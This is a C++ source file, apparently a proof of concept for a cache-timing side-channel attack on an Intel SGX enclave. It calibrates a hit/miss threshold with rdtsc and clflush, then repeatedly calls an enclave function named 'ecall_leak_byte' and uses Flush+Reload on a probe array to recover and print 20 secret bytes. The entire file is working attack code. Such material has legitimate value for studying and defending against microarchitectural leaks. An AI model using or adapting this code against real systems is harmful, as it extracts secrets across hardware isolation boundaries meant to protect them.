#include <cstdio>
#include <iostream>
#include <x86intrin.h>
#include "Enclave_u.h"
#include "sgx_urts.h"
#include "App.h"

sgx_enclave_id_t global_eid = 0;

char shared[256 * 4096];
int junk = 1;
static uint64_t THRESHOLD = 80;

void cal_threshold() {
    char test_array[256];
    for (char &i: test_array) {
        i = 'A';
        _mm_clflush(&i);
        _mm_mfence();
    }
    uint64_t HIT = 0, MISS = 0;
    uint64_t t1, t2;
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&i);
        _mm_mfence();

        t1 = __rdtsc();
        junk &= test_array[i];
        _mm_mfence();
        t2 = __rdtsc();
        MISS += t2 - t1;

        t1 = __rdtsc();
        junk &= test_array[i];
        _mm_mfence();
        t2 = __rdtsc();
        HIT += t2 - t1;
    }
    THRESHOLD = (2 * HIT + MISS) / 256 / 3;
    printf("THRESHOLD: %lu, AVG_HIT: %.2f, AVG_MISS: %.2f.\n", THRESHOLD, (double) HIT / 256, (double) MISS / 256);
}

void flush() {
    for (int i = 0; i < 256; i++) {
        shared[i * 4096] = '0';
        _mm_clflush(&shared[i * 4096]);
        _mm_mfence();
    }
}

void attack() {
    char size = 0;
    int score[256];
    int round = 100;
    cal_threshold();
    while (size < 20) {
        // init score for cur byte
        for (int &i: score) i = 0;
        for (int j = round; j > 0; j--) {
            // flush
            flush();
            // ecall
            ecall_leak_byte(global_eid, shared, size);
            // reload
            for (int i = 0; i < 256; i++) {
                int mix_i = ((i * 167) + 13) & 255;
                uint64_t time1 = __rdtsc();
                junk &= shared[mix_i * 4096];
                _mm_mfence();
                uint64_t time2 = __rdtsc();
                uint64_t time = time2 - time1;
                if (time < THRESHOLD) {
                    score[mix_i]++;
                }
            }
        }
        // output
        int h = 0, l = 0;
        for (int i = 0; i < 256; i++) {
            if (score[i] >= score[h]) {
                l = h;
                h = i;
            }
        }
        if (h != l && score[h] < 2 * score[l])
            printf("reading secret at %p.. best: 0x%.2x(%c), score: %3d/%d(second: 0x%.2x, score: %3d/%d).\n",
                   &size + size, h, h, score[h], round, l, score[l], round);
        else
            printf("reading secret at %p.. best: 0x%.2x(%c), score: %3d/%d.\n",
                   &size + size, h, h, score[h], round);
        size++;
    }
}

int main() {
    initialize_enclave(&global_eid, "enclave.token", "enclave.signed.so");
    attack();
    return 0;
}
